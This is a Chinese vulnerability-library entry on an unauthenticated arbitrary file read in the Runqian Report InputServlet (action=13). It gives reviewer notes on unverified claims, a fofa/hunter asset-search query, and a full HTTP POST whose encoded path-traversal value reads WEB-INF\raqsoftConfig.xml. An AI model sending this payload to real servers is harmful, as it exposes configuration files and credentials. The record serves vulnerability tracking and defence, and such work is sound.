---
source: "wy876 漏洞文库"
title: "润乾报表 InputServlet action13配置读取"
product: "润乾报表"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Windows式反斜杠，版本未知"
prerequisites: "匿名声称，无Cookie示例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/myq4mz6ygioo0z8s"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B6%A6%E4%B9%BE%E6%8A%A5%E8%A1%A8/%E6%B6%A6%E4%B9%BE%E6%8A%A5%E8%A1%A8InputServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"润乾报表平台\""
id: "vw-c806177e53fc3ecee875b88b"
entity_id: "ve-c806177e53fc3ecee875b88b"
schema_version: "1"
---

# 润乾报表 InputServlet action13配置读取

## 条目说明

- 对象与具体问题：润乾报表；InputServlet action13配置读取
- 版本、配置及部署条件：Windows式反斜杠，版本未知
- 认证与权限前提：匿名声称，无Cookie示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 实际file指向raqsoftConfig.xml，upFileName web.config可能只是下载文件名，不能当读取两个配置
- 与action12同Servlet不同功能，保留关联而非重复合并
- 缺返回内容、路径范围/进程权限、修复版本；HTTP误标Java

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
润乾报表是一个纯JAVA的企业级报表工具支持对J2EE系统的嵌入式部署，无缝集成。服务器端支持各种常见的操作系统，提供高效的报表设计方案、强大的报表展现能力、灵活的部署机制，支持强关联语义模型，并且具备强有力的填报功能和olap分析，为企业级数据分析与商业智能提供了高性能、高效率的报表系统解决方案。润乾报表InputServlet存在任意文件读取漏洞，未经身份攻击者可通过该漏洞读取系统内部配置文件及敏感数据凭证，使系统处于极不安全状态。

## 二、影响版本
+ 润乾报表

## 三、资产测绘
+ hunter`app.name="润乾报表平台"`
+ 特征


## 四、漏洞复现
```http
POST /InputServlet?action=13 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Type: application/x-www-form-urlencoded
Connection: close
 
file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/myq4mz6ygioo0z8s>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
